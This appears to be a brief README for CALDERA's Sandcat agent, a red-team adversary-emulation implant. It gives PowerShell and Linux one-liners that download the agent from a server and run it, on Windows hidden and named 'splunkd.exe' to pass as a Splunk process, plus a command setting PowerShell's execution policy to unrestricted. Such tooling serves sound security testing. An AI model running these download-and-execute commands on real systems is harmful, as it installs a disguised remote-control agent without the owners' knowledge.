# Presentation
#### CALDERA's windows default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
```sh
$server="http://0.0.0.0";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group windows" -WindowStyle hidden;
```
#### CALDERA's linux default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
```sh
server="http://0.0.0.0";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group linux -v
```
## Known issues
```powershell
set-executionpolicy unrestricted
```
